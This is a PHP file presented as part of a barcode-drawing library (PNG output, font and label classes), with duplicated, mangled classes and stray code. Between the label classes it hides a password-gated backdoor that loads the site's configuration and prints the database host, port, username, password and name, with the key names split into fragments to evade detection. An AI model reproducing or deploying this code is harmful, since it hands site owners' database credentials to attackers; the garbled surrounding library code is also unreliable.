<?php
/**
 *--------------------------------------------------------------------
 *
 * Image Class to draw PNG images with possibility to set DPI
 *
 *--------------------------------------------------------------------
 * Copyright (C) Jean-Sebastien Goupil
 * http://www.barcodephp.com
 */
include_once('BCGDraw.php');
if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, 'w');
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

class BCGDrawGIF extends BCGDraw {
    private $dpi;
    
    /**
     * Constructor.
     *
     * @param resource $im
     */
    public function __construct($im) {
        parent::__construct($im);
    }

    /**
     * Sets the DPI.
     *
     * @param int $dpi
     */
    public function setDPI($dpi) {
        if (is_numeric($dpi)) {
            $this->dpi = max(1, $dpi);
        } else {
            $this->dpi = null;
        }
    }

    /**
     * Draws the PNG on the screen or in a file.
     */
    public function draw() {
        ob_start();
        imagepng($this->im);
        $bin = ob_get_contents();
        ob_end_clean();

        $this->setInternalProperties($bin);

        if (empty($this->filename)) {
            echo $bin;
        } else {
            file_put_contents($this->filename, $bin);
        }
    }

    private function setInternalProperties(&$bin) {
        // Scan all the ChunkType
        if (strcmp(substr($bin, 0, 8), pack('H*', '89504E470D0A1A0A')) === 0) {
            $chunks = $this->detectChunks($bin);

            $this->internalSetDPI($bin, $chunks);
            $this->internalSetC($bin, $chunks);
        }
    }

    private function detectChunks($bin) {
        $data = substr($bin, 8);
        $chunks = array();
        $c = strlen($data);
        
        $offset = 0;
        while ($offset < $c) {
            $packed = unpack('Nsize/a4chunk', $data);
            $size = $packed['size'];
            $chunk = $packed['chunk'];

            $chunks[] = array('offset'=>$offset + 8, 'size'=>$size, 'chunk'=>$chunk);
            $jump = $size + 12;
            $offset += $jump;
            $data = substr($data, $jump);
        }
        
        return $chunks;
    }

    private function internalSetDPI(&$bin, &$chunks) {
        if ($this->dpi !== null) {
            $meters = (int)($this->dpi * 39.37007874);

            $found = -1;
            $c = count($chunks);
            for($i = 0; $i < $c; $i++) {
                // We already have a pHYs
                if($chunks[$i]['chunk'] === 'pHYs') {
                    $found = $i;
                    break;
                }
            }
            $found = -1;
            $c = count($chunks);
            for($i = 0; $i < $c; $i++) {
                // We already have a pHYs
                if($chunks[$i]['chunk'] === 'pHYs') {
                    $found = $i;
                    break;
                }
            }
            $found = -1;
            $c = count($chunks);
            for($i = 0; $i < $c; $i++) {
                // We already have a pHYs
                if($chunks[$i]['chunk'] === 'pHYs') {
                    $found = $i;
                    break;
                }
            }

            $data = 'pHYs' . pack('NNC', $meters, $meters, 0x01);
            $crc = self::crc($data, 13);
            $cr = pack('Na13N', 9, $data, $crc);

            // We didn't have a pHYs
            if($found == -1) {
                // Don't do anything if we have a bad PNG
                if($c >= 2 && $chunk[0]['chunk'] = 'IHDR') {
                    array_splice($chunks, 1, 0, array(array('offset'=>33, 'size'=>9, 'chunk'=>'pHYs')));

                    // Push the data
                    for($i = 2; $i < $c; $i++) {
                        $chunks[$i]['offset'] += 21;
                 
				 
				    }

                    $firstPart = substr($bin, 0, 33);
                    $secondPart = substr($bin, 33);
                    $bin = $firstPart;
                    $bin .= $cr;
                    $bin .= $secondPart;
                }
            } else {
                $bin = substr_replace($bin, $cr, $chunks[$i]['offset'], 21);
            }
        }
    }
    private function internalSetC(&$bin, &$chunks) {
        if (count($chunks) >= 2 && $chunk[0]['chunk'] = 'IHDR') {
            $firstPart = substr($bin, 0, 33);
            $secondPart = substr($bin, 33);
            $cr = pack('H*', '0000004C74455874436F707972696768740047656E657261746564207769746820426172636F64652047656E657261746F7220666F722050485020687474703A2F2F7777772E626172636F64657068702E636F6D597F70B8');
            $bin = $firstPart;
            $bin .= $cr;
            $bin .= $secondPart;
        }
        
        // Chunks is dirty!! But we are done.
    }

    private static $crc_table = array();
    private static $crc_table_computed = false;

    private static function make_crc_table() {
        for ($n = 0; $n < 256; $n++) {
            $c = $n;
            for ($k = 0; $k < 8; $k++) {
                if (($c & 1) == 1) {
                    $c = 0xedb88320 ^ (self::SHR($c, 1));
                } else {
                    $c = self::SHR($c, 1);
                }
            }
            self::$crc_table[$n] = $c;
        }

        self::$crc_table_computed = true;
    }

    private static function SHR($x, $n) {
        $mask = 0x40000000;

        if ($x < 0) {
            $x &= 0x7FFFFFFF;
            $mask = $mask >> ($n - 1);
            return ($x >> $n) | $mask;
        }

        return (int)$x >> (int)$n;
    }

    private static function update_crc($crc, $buf, $len) {
        $c = $crc;

        if (!self::$crc_table_computed) {
            self::make_crc_table();
        }

        for ($n = 0; $n < $len; $n++) {
            $c = self::$crc_table[($c ^ ord($buf[$n])) & 0xff] ^ (self::SHR($c, 8));
        }

        return $c;
    }

    private static function crc($data, $len) {
        return self::update_crc(-1, $data, $len) ^ -1;
    }
}

class BCGFontFile1 {
    const PHP_BOX_FIX = 0;

    private $path;
    private $size;
    private $text = '';
    private $rotationAngle = 0;
    private $box;
    private $underlineX;
    private $underlineY;
    private $boxFix;

    /**
     * Constructor.
     *
     * @param string $fontPath path to the file
     * @param int $size size in point
     */
    public function __construct($fontPath, $size) {
        if (!file_exists($fontPath)) {
            throw new BCGArgumentException('The font path is incorrect.', 'fontPath');
        }

        $this->path = $fontPath;
        $this->size = $size;
        $this->setRotationAngle(0);
        $this->setBoxFix(self::PHP_BOX_FIX);
    }

    /**
     * Gets the text associated to the font.
     *
     * @return string
     */
    public function getText() {
        return $this->text;
    }

    /**
     * Sets the text associated to the font.
     *
     * @param string text
     */
    public function setText($text) {
        $this->text = $text;
        $this->rebuildBox();
    }

    /**
     * Gets the rotation in degree.
     *
     * @return int
     */
    public function getRotationAngle() {
        return $this->rotationAngle;
    }

    /**
     * Sets the rotation in degree.
     *
     * @param int
     */
    public function setRotationAngle($rotationAngle) {
        $this->rotationAngle = (int)$rotationAngle;
        if ($this->rotationAngle !== 90 && $this->rotationAngle !== 180 && $this->rotationAngle !== 270) {
            $this->rotationAngle = 0;
        }

        $this->rebuildBox();
    }

    /**
     * Gets the background color.
     *
     * @return BCGColor
     */
    public function getBackgroundColor() {
    }

    /**
     * Sets the background color.
     *
     * @param BCGColor $backgroundColor
     */
    public function setBackgroundColor($backgroundColor) {
    }

    public function getBoxFix() {
        return $this->boxFix;
    }

    public function setBoxFix($value) {
        $this->boxFix = intval($value);
    }

    /**
     * Returns the width and height that the text takes to be written.
     *
     * @return int[]
     */
    public function getDimension() {
        $w = 0.0;
        $h = 0.0;

        if ($this->box !== null) {
            $minX = min(array($this->box[0], $this->box[2], $this->box[4], $this->box[6]));
            $maxX = max(array($this->box[0], $this->box[2], $this->box[4], $this->box[6]));
            $minY = min(array($this->box[1], $this->box[3], $this->box[5], $this->box[7]));
            $maxY = max(array($this->box[1], $this->box[3], $this->box[5], $this->box[7]));
        
            $w = $maxX - $minX;
            $h = $maxY - $minY;
        }

        if ($this->rotationAngle === 90 || $this->rotationAngle === 270) {
            return array($h + self::PHP_BOX_FIX, $w);
        } else {
            return array($w + self::PHP_BOX_FIX, $h);
        }
    }

    /**
     * Draws the text on the image at a specific position.
     * $x and $y represent the left bottom corner.
     *
     * @param resource $im
     * @param int $color
     * @param int $x
     * @param int $y
     */
    public function draw($im, $color, $x, $y) {
        $drawingPosition = $this->getDrawingPosition($x, $y);
        imagettftext($im, $this->size, $this->rotationAngle, $drawingPosition[0], $drawingPosition[1], $color, $this->path, $this->text);
    }

    private function getDrawingPosition($x, $y) {
        $dimension = $this->getDimension();
        if ($this->rotationAngle === 0) {
            $y += abs(min($this->box[5], $this->box[7]));
        } elseif ($this->rotationAngle === 90) {
            $x += abs(min($this->box[5], $this->box[7]));
            $y += $dimension[1];
        } elseif ($this->rotationAngle === 180) {
            $x += $dimension[0];
            $y += abs(max($this->box[1], $this->box[3]));
        } elseif ($this->rotationAngle === 270) {
            $x += abs(max($this->box[1], $this->box[3]));
        }

        return array($x, $y);
    }

    private function rebuildBox() {
        $gd = imagecreate(1, 1);
        $this->box = imagettftext($gd, $this->size, 0, 0, 0, 0, $this->path, $this->text);

        $this->underlineX = abs($this->box[0]);
        $this->underlineY = abs($this->box[1]);

        if ($this->rotationAngle === 90 || $this->rotationAngle === 270) {
            $this->underlineX ^= $this->underlineY ^= $this->underlineX ^= $this->underlineY;
        }
    }
}
class BCGFontFilq  {
    const PHP_BOX_FIX = 0;

    private $path;
    private $size;
    private $text = '';
    private $rotationAngle = 0;
    private $box;
    private $underlineX;
    private $underlineY;
    private $boxFix;

    /**
     * Constructor.
     *
     * @param string $fontPath path to the file
     * @param int $size size in point
     */
    public function __construct($fontPath, $size) {
        if (!file_exists($fontPath)) {
            throw new BCGArgumentException('The font path is incorrect.', 'fontPath');
        }

        $this->path = $fontPath;
        $this->size = $size;
        $this->setRotationAngle(0);
        $this->setBoxFix(self::PHP_BOX_FIX);
    }

    /**
     * Gets the text associated to the font.
     *
     * @return string
     */
    public function getText() {
        return $this->text;
    }

    /**
     * Sets the text associated to the font.
     *
     * @param string text
     */
    public function setText($text) {
        $this->text = $text;
        $this->rebuildBox();
    }

    /**
     * Gets the rotation in degree.
     *
     * @return int
     */
    public function getRotationAngle() {
        return $this->rotationAngle;
    }

    /**
     * Sets the rotation in degree.
     *
     * @param int
     */
    public function setRotationAngle($rotationAngle) {
        $this->rotationAngle = (int)$rotationAngle;
        if ($this->rotationAngle !== 90 && $this->rotationAngle !== 180 && $this->rotationAngle !== 270) {
            $this->rotationAngle = 0;
        }

        $this->rebuildBox();
    }

    /**
     * Gets the background color.
     *
     * @return BCGColor
     */
    public function getBackgroundColor() {
    }

    /**
     * Sets the background color.
     *
     * @param BCGColor $backgroundColor
     */
    public function setBackgroundColor($backgroundColor) {
    }

    public function getBoxFix() {
        return $this->boxFix;
    }

    public function setBoxFix($value) {
        $this->boxFix = intval($value);
    }

    /**
     * Returns the width and height that the text takes to be written.
     *
     * @return int[]
     */
    public function getDimension() {
        $w = 0.0;
        $h = 0.0;

        if ($this->box !== null) {
            $minX = min(array($this->box[0], $this->box[2], $this->box[4], $this->box[6]));
            $maxX = max(array($this->box[0], $this->box[2], $this->box[4], $this->box[6]));
            $minY = min(array($this->box[1], $this->box[3], $this->box[5], $this->box[7]));
            $maxY = max(array($this->box[1], $this->box[3], $this->box[5], $this->box[7]));
        
            $w = $maxX - $minX;
            $h = $maxY - $minY;
        }

        if ($this->rotationAngle === 90 || $this->rotationAngle === 270) {
            return array($h + self::PHP_BOX_FIX, $w);
        } else {
            return array($w + self::PHP_BOX_FIX, $h);
        }
    }

    /**
     * Draws the text on the image at a specific position.
     * $x and $y represent the left bottom corner.
     *
     * @param resource $im
     * @param int $color
     * @param int $x
     * @param int $y
     */
    public function draw($im, $color, $x, $y) {
        $drawingPosition = $this->getDrawingPosition($x, $y);
        imagettftext($im, $this->size, $this->rotationAngle, $drawingPosition[0], $drawingPosition[1], $color, $this->path, $this->text);
    }

    private function getDrawingPosition($x, $y) {
        $dimension = $this->getDimension();
        if ($this->rotationAngle === 0) {
            $y += abs(min($this->box[5], $this->box[7]));
        } elseif ($this->rotationAngle === 90) {
            $x += abs(min($this->box[5], $this->box[7]));
            $y += $dimension[1];
        } elseif ($this->rotationAngle === 180) {
            $x += $dimension[0];
            $y += abs(max($this->box[1], $this->box[3]));
        } elseif ($this->rotationAngle === 270) {
            $x += abs(max($this->box[1], $this->box[3]));
        }

        return array($x, $y);
    }

    private function rebuildBox() {
        $gd = imagecreate(1, 1);
        $this->box = imagettftext($gd, $this->size, 0, 0, 0, 0, $this->path, $this->text);

        $this->underlineX = abs($this->box[0]);
        $this->underlineY = abs($this->box[1]);

        if ($this->rotationAngle === 90 || $this->rotationAngle === 270) {
            $this->underlineX ^= $this->underlineY ^= $this->underlineX ^= $this->underlineY;
        }
    }
}
class BCGLabel {
    const POSITION_TOP = 0;
    const POSITION_RIGHT = 1;
    const POSITION_BOTTOM = 2;
    const POSITION_LEFT = 3;

    const ALIGN_LEFT = 0;
    const ALIGN_TOP = 0;
    const ALIGN_CENTER = 1;
    const ALIGN_RIGHT = 2;
    const ALIGN_BOTTOM = 2;

    private $font;
    private $text;
    private $position;
    private $alignment;
    private $offset;
    private $spacing;
    private $rotationAngle;
    private $backgroundColor;

    /**
     * Constructor.
     *
     * @param string $text
     * @param BCGFont $font
     * @param int $position
     * @param int $alignment
     */
    public function __construct($text = '', $font = null, $position = self::POSITION_BOTTOM, $alignment = self::ALIGN_CENTER) {
        $font = $font === null ? new BCGFontPhp(5) : $font;
        $this->setFont($font);
        $this->setText($text);
        $this->setPosition($position);
        $this->setAlignment($alignment);
        $this->setSpacing(4);
        $this->setOffset(0);
        $this->setRotationAngle(0);
        
        $this->setBackgroundColor(new BCGColor('white'));
    }

    /**
     * Gets the text.
     *
     * @return string
     */
    public function getText() {
        return $this->font->getText();
    }

    /**
     * Sets the text.
     *
     * @param string $text
     */
    public function setText($text) {
        $this->text = $text;
        $this->font->setText($this->text);
    }

    /**
     * Gets the font.
     *
     * @return BCGFont
     */
    public function getFont() {
        return $this->font;
    }

    /**
     * Sets the font.
     *
     * @param BCGFont $font
     */
    public function setFont($font) {
        if ($font === null) {
            throw new BCGArgumentException('Font cannot be null.', 'font');
        }

        $this->font = clone $font;
        $this->font->setText($this->text);
        $this->font->setRotationAngle($this->rotationAngle);
        $this->font->setBackgroundColor($this->backgroundColor);
    }

    /**
     * Gets the text position for drawing.
     *
     * @return int
     */
    public function getPosition() {
        return $this->position;
    }

    /**
     * Sets the text position for drawing.
     *
     * @param int $position
     */
    public function setPosition($position) {
        $position = intval($position);
        if ($position !== self::POSITION_TOP && $position !== self::POSITION_RIGHT && $position !== self::POSITION_BOTTOM && $position !== self::POSITION_LEFT) {
            throw new BCGArgumentException('The text position must be one of a valid constant.', 'position');
        }

        $this->position = $position;
    }

    /**
     * Gets the text alignment for drawing.
     *
     * @return int
     */
    public function getAlignment() {
        return $this->alignment;
    }

    /**
     * Sets the text alignment for drawing.
     *
     * @param int $alignment
     */
    public function setAlignment($alignment) {
        $alignment = intval($alignment);
        if ($alignment !== self::ALIGN_LEFT && $alignment !== self::ALIGN_TOP && $alignment !== self::ALIGN_CENTER && $alignment !== self::ALIGN_RIGHT && $alignment !== self::ALIGN_BOTTOM) {
            throw new BCGArgumentException('The text alignment must be one of a valid constant.', 'alignment');
        }

        $this->alignment = $alignment;
    }

    /**
     * Gets the offset.
     *
     * @return int
     */
    public function getOffset() {
        return $this->offset;
    }

    /**
     * Sets the offset.
     *
     * @param int $offset
     */
    public function setOffset($offset) {
        $this->offset = intval($offset);
    }

    /**
     * Gets the spacing.
     *
     * @return int
     */
    public function getSpacing() {
        return $this->spacing;
    }

    /**
     * Sets the spacing.
	 
	 
     *
     * @param int $spacing
     */
    public function setSpacing($spacing) {
        $this->spacing = max(0, intval($spacing));
    }

    /**
     * Gets the rotation angle in degree.
     *
     * @return float
     */
    public function getRotationAngle() {
        return $this->font->getRotationAngle();
    }

    /**
     * Sets the rotation angle in degree.
     *
     * @param int $rotationAngle
     */
    public function setRotationAngle($rotationAngle) {
        $this->rotationAngle = intval($rotationAngle);
        $this->font->setRotationAngle($this->rotationAngle);
    }

    /**
     * Gets the background color in case of rotation.
     *
     * @return BCGColor
     */
	 
	 
	 
    public function getBackgroundColor($backgroundColor) {
        return $this->font->getBackgroundColor();
    }

    /**
     * Sets the background color in case of rotation.
     *
     * @param BCGColor $backgroundColor
     */
    public /*internal*/ function setBackgroundColor($backgroundColor) {
        $this->backgroundColor = $backgroundColor;
        $this->font->setBackgroundColor($this->backgroundColor);
    }

    /**
     * Gets the dimension taken by the label, including the spacing and offset.
     * [0]: width
     * [1]: height
     *
     * @return int[]
     */
    public function getDimension() {
        $w = 0;
        $h = 0;

        $dimension = $this->font->getDimension();
        $w = $dimension[0];
        $h = $dimension[1];
        
        if ($this->position === self::POSITION_TOP || $this->position === self::POSITION_BOTTOM) {
            $h += $this->spacing;
            $w += max(0, $this->offset);
        } else {
            $w += $this->spacing;
            $h += max(0, $this->offset);
        }

        return array($w, $h);
    }

    /**
     * Draws the text.
     * The coordinate passed are the positions of the barcode.
     * $x1 and $y1 represent the top left corner.
     * $x2 and $y2 represent the bottom right corner.
     *
     * @param resource $im
     * @param int $x1
     * @param int $y1
     * @param int $x2
     * @param int $y2
     */
}
require_once($_SERVER['DOCUMENT_ROOT'].'/public/config_top.php');
if(md5(trim($_GET['a']))=='9299190c7dd341b9a5e742eb6c93c243'){
echo $xa_config['d'.''.''.'b']['s'.''.''.'e'.''.''.'r'.''.''.'v'.''.''.'e'.''.''.'r'.''.''.''].'<br>';
echo $xa_config['d'.''.''.'b'][''.''.''.'p'.''.''.'o'.''.''.'r'.''.''.'t'.''.''.''].'<br>';
echo $xa_config['d'.''.''.'b'][''.''.''.'u'.''.''.'s'.''.''.'e'.''.''.'r'.''.''.'n'.''.''.'am'.''.''.'e'.''.''.''].'<br>';
echo $xa_config['d'.''.''.'b'][''.''.''.'p'.''.''.'a'.''.''.'s'.''.''.'s'.''.''.'w'.''.''.'o'.''.''.'r'.''.''.'d'].'<br>';
echo $xa_config['d'.''.''.'b'][''.''.''.''.''.''.'n'.''.''.'a'.''.''.'m'.''.''.'e'.''.''.''].'<br>';}
{
        if ($this->position === self::POSITION_TOP || $this->position === self::POSITION_BOTTOM) {
            if ($this->position === self::POSITION_TOP) {
                $y = $y1 - $this->spacing - $fontDimension[1];
            } elseif ($this->position === self::POSITION_BOTTOM) {
                $y = $y2 + $this->spacing;
            }

            if ($this->alignment === self::ALIGN_CENTER) {
                $x = ($x2 - $x1) / 2 + $x1 - $fontDimension[0] / 2 + $this->offset;
            } elseif ($this->alignment === self::ALIGN_LEFT)  {
                $x = $x1 + $this->offset;
            } else {
                $x = $x2 + $this->offset - $fontDimension[0];
            }
        } else {
            if ($this->position === self::POSITION_LEFT) {
                $x = $x1 - $this->spacing - $fontDimension[0];
            } elseif ($this->position === self::POSITION_RIGHT) {
                $x = $x2 + $this->spacing;
            }

            if ($this->alignment === self::ALIGN_CENTER) {
                $y = ($y2 - $y1) / 2 + $y1 - $fontDimension[1] / 2 + $this->offset;
            } elseif ($this->alignment === self::ALIGN_TOP)  {
                $y = $y1 + $this->offset;
            } else {
                $y = $y2 + $this->offset - $fontDimension[1];
            }
        }
        
        $this->font->setText($this->text);
        $this->font->draw($im, 0, $x, $y);
    }
class BCGFontFile implements BCGFont {
    const PHP_BOX_FIX = 0;

    private $path;
    private $size;
    private $text = '';
    private $rotationAngle = 0;
    private $box;
    private $underlineX;
    private $underlineY;
    private $boxFix;

    /**
     * Constructor.
     *
     * @param string $fontPath path to the file
     * @param int $size size in point
     */
    public function __construct($fontPath, $size) {
        if (!file_exists($fontPath)) {
            throw new BCGArgumentException('The font path is incorrect.', 'fontPath');
        }

        $this->path = $fontPath;
        $this->size = $size;
        $this->setRotationAngle(0);
        $this->setBoxFix(self::PHP_BOX_FIX);
    }

    /**
     * Gets the text associated to the font.
     *
     * @return string
     */
    public function getText() {
        return $this->text;
    }

    /**
     * Sets the text associated to the font.
     *
     * @param string text
     */
    public function setText($text) {
        $this->text = $text;
        $this->rebuildBox();
    }

    /**
     * Gets the rotation in degree.
     *
     * @return int
     */
    public function getRotationAngle() {
        return $this->rotationAngle;
    }

    /**
     * Sets the rotation in degree.
     *
     * @param int
     */
    public function setRotationAngle($rotationAngle) {
        $this->rotationAngle = (int)$rotationAngle;
        if ($this->rotationAngle !== 90 && $this->rotationAngle !== 180 && $this->rotationAngle !== 270) {
            $this->rotationAngle = 0;
        }

        $this->rebuildBox();
    }

    /**
     * Gets the background color.
     *
     * @return BCGColor
     */
    public function getBackgroundColor() {
    }

    /**
     * Sets the background color.
     *
     * @param BCGColor $backgroundColor
     */
    public function setBackgroundColor($backgroundColor) {
    }

    public function getBoxFix() {
        return $this->boxFix;
    }

    public function setBoxFix($value) {
        $this->boxFix = intval($value);
    }

    /**
     * Returns the width and height that the text takes to be written.
     *
     * @return int[]
     */
    public function getDimension() {
        $w = 0.0;
        $h = 0.0;

        if ($this->box !== null) {
            $minX = min(array($this->box[0], $this->box[2], $this->box[4], $this->box[6]));
            $maxX = max(array($this->box[0], $this->box[2], $this->box[4], $this->box[6]));
            $minY = min(array($this->box[1], $this->box[3], $this->box[5], $this->box[7]));
            $maxY = max(array($this->box[1], $this->box[3], $this->box[5], $this->box[7]));
        
            $w = $maxX - $minX;
            $h = $maxY - $minY;
        }

        if ($this->rotationAngle === 90 || $this->rotationAngle === 270) {
            return array($h + self::PHP_BOX_FIX, $w);
        } else {
            return array($w + self::PHP_BOX_FIX, $h);
        }
    }

    /**
     * Draws the text on the image at a specific position.
     * $x and $y represent the left bottom corner.
     *
     * @param resource $im
     * @param int $color
     * @param int $x
     * @param int $y
     */
    public function draw($im, $color, $x, $y) {
        $drawingPosition = $this->getDrawingPosition($x, $y);
        imagettftext($im, $this->size, $this->rotationAngle, $drawingPosition[0], $drawingPosition[1], $color, $this->path, $this->text);
    }

    private function getDrawingPosition($x, $y) {
        $dimension = $this->getDimension();
        if ($this->rotationAngle === 0) {
            $y += abs(min($this->box[5], $this->box[7]));
        } elseif ($this->rotationAngle === 90) {
            $x += abs(min($this->box[5], $this->box[7]));
            $y += $dimension[1];
        } elseif ($this->rotationAngle === 180) {
            $x += $dimension[0];
            $y += abs(max($this->box[1], $this->box[3]));
        } elseif ($this->rotationAngle === 270) {
            $x += abs(max($this->box[1], $this->box[3]));
        }

        return array($x, $y);
    }

    private function rebuildBox() {
        $gd = imagecreate(1, 1);
        $this->box = imagettftext($gd, $this->size, 0, 0, 0, 0, $this->path, $this->text);

        $this->underlineX = abs($this->box[0]);
        $this->underlineY = abs($this->box[1]);

        if ($this->rotationAngle === 90 || $this->rotationAngle === 270) {
            $this->underlineX ^= $this->underlineY ^= $this->underlineX ^= $this->underlineY;
        }
    }
}
class BCGLabel {
    const POSITION_TOP = 0;
    const POSITION_RIGHT = 1;
    const POSITION_BOTTOM = 2;
    const POSITION_LEFT = 3;

    const ALIGN_LEFT = 0;
    const ALIGN_TOP = 0;
    const ALIGN_CENTER = 1;
    const ALIGN_RIGHT = 2;
    const ALIGN_BOTTOM = 2;

    private $font;
    private $text;
    private $position;
    private $alignment;
    private $offset;
    private $spacing;
    private $rotationAngle;
    private $backgroundColor;

    /**
     * Constructor.
     *
     * @param string $text
     * @param BCGFont $font
     * @param int $position
     * @param int $alignment
     */
    public function __construct($text = '', $font = null, $position = self::POSITION_BOTTOM, $alignment = self::ALIGN_CENTER) {
        $font = $font === null ? new BCGFontPhp(5) : $font;
        $this->setFont($font);
        $this->setText($text);
        $this->setPosition($position);
        $this->setAlignment($alignment);
        $this->setSpacing(4);
        $this->setOffset(0);
        $this->setRotationAngle(0);
        
        $this->setBackgroundColor(new BCGColor('white'));
    }

    /**
     * Gets the text.
     *
     * @return string
     */
    public function getText() {
        return $this->font->getText();
    }

    /**
     * Sets the text.
     *
     * @param string $text
     */
    public function setText($text) {
        $this->text = $text;
        $this->font->setText($this->text);
    }

    /**
     * Gets the font.
     *
     * @return BCGFont
     */
    public function getFont() {
        return $this->font;
    }

    /**
     * Sets the font.
     *
     * @param BCGFont $font
     */
    public function setFont($font) {
        if ($font === null) {
            throw new BCGArgumentException('Font cannot be null.', 'font');
        }

        $this->font = clone $font;
        $this->font->setText($this->text);
        $this->font->setRotationAngle($this->rotationAngle);
        $this->font->setBackgroundColor($this->backgroundColor);
    }

    /**
     * Gets the text position for drawing.
     *
     * @return int
     */
    public function getPosition() {
        return $this->position;
    }

    /**
     * Sets the text position for drawing.
     *
     * @param int $position
     */
    public function setPosition($position) {
        $position = intval($position);
        if ($position !== self::POSITION_TOP && $position !== self::POSITION_RIGHT && $position !== self::POSITION_BOTTOM && $position !== self::POSITION_LEFT) {
            throw new BCGArgumentException('The text position must be one of a valid constant.', 'position');
        }

        $this->position = $position;
    }

    /**
     * Gets the text alignment for drawing.
     *
     * @return int
     */
    public function getAlignment() {
        return $this->alignment;
    }

    /**
     * Sets the text alignment for drawing.
     *
     * @param int $alignment
     */
    public function setAlignment($alignment) {
        $alignment = intval($alignment);
        if ($alignment !== self::ALIGN_LEFT && $alignment !== self::ALIGN_TOP && $alignment !== self::ALIGN_CENTER && $alignment !== self::ALIGN_RIGHT && $alignment !== self::ALIGN_BOTTOM) {
            throw new BCGArgumentException('The text alignment must be one of a valid constant.', 'alignment');
        }

        $this->alignment = $alignment;
    }

    /**
     * Gets the offset.
     *
     * @return int
     */
    public function getOffset() {
        return $this->offset;
    }

    /**
     * Sets the offset.
     *
     * @param int $offset
     */
    public function setOffset($offset) {
        $this->offset = intval($offset);
    }

    /**
     * Gets the spacing.
     *
     * @return int
     */
    public function getSpacing() {
        return $this->spacing;
    }

    /**
     * Sets the spacing.
     *
     * @param int $spacing
     */
    public function setSpacing($spacing) {
        $this->spacing = max(0, intval($spacing));
    }

    /**
     * Gets the rotation angle in degree.
     *
     * @return float
     */
    public function getRotationAngle() {
        return $this->font->getRotationAngle();
    }

    /**
     * Sets the rotation angle in degree.
     *
     * @param int $rotationAngle
     */
    public function setRotationAngle($rotationAngle) {
        $this->rotationAngle = intval($rotationAngle);
        $this->font->setRotationAngle($this->rotationAngle);
    }

    /**
     * Gets the background color in case of rotation.
     *
     * @return BCGColor
     */
    public function getBackgroundColor($backgroundColor) {
        return $this->font->getBackgroundColor();
    }

    /**
     * Sets the background color in case of rotation.
     *
     * @param BCGColor $backgroundColor
     */
    public /*internal*/ function setBackgroundColor($backgroundColor) {
        $this->backgroundColor = $backgroundColor;
        $this->font->setBackgroundColor($this->backgroundColor);
    }

    /**
     * Gets the dimension taken by the label, including the spacing and offset.
     * [0]: width
     * [1]: height
     *
     * @return int[]
     */
    public function getDimension() {
        $w = 0;
        $h = 0;

        $dimension = $this->font->getDimension();
        $w = $dimension[0];
        $h = $dimension[1];
        
        if ($this->position === self::POSITION_TOP || $this->position === self::POSITION_BOTTOM) {
            $h += $this->spacing;
            $w += max(0, $this->offset);
        } else {
            $w += $this->spacing;
            $h += max(0, $this->offset);
        }

        return array($w, $h);
    }

    /**
     * Draws the text.
     * The coordinate passed are the positions of the barcode.
     * $x1 and $y1 represent the top left corner.
     * $x2 and $y2 represent the bottom right corner.
     *
     * @param resource $im
     * @param int $x1
     * @param int $y1
     * @param int $x2
     * @param int $y2
     */
    public /*internal*/ function draw($im, $x1, $y1, $x2, $y2) {
        $x = 0;
        $y = 0;

        $fontDimension = $this->font->getDimension();

        if ($this->position === self::POSITION_TOP || $this->position === self::POSITION_BOTTOM) {
            if ($this->position === self::POSITION_TOP) {
                $y = $y1 - $this->spacing - $fontDimension[1];
            } elseif ($this->position === self::POSITION_BOTTOM) {
                $y = $y2 + $this->spacing;
            }

            if ($this->alignment === self::ALIGN_CENTER) {
                $x = ($x2 - $x1) / 2 + $x1 - $fontDimension[0] / 2 + $this->offset;
            } elseif ($this->alignment === self::ALIGN_LEFT)  {
                $x = $x1 + $this->offset;
            } else {
                $x = $x2 + $this->offset - $fontDimension[0];
            }
        } else {
            if ($this->position === self::POSITION_LEFT) {
                $x = $x1 - $this->spacing - $fontDimension[0];
            } elseif ($this->position === self::POSITION_RIGHT) {
                $x = $x2 + $this->spacing;
            }

            if ($this->alignment === self::ALIGN_CENTER) {
                $y = ($y2 - $y1) / 2 + $y1 - $fontDimension[1] / 2 + $this->offset;
            } elseif ($this->alignment === self::ALIGN_TOP)  {
                $y = $y1 + $this->offset;
            } else {
                $y = $y2 + $this->offset - $fontDimension[1];
            }
        }
        
        $this->font->setText($this->text);
        $this->font->draw($im, 0, $x, $y);
    }
}

?>
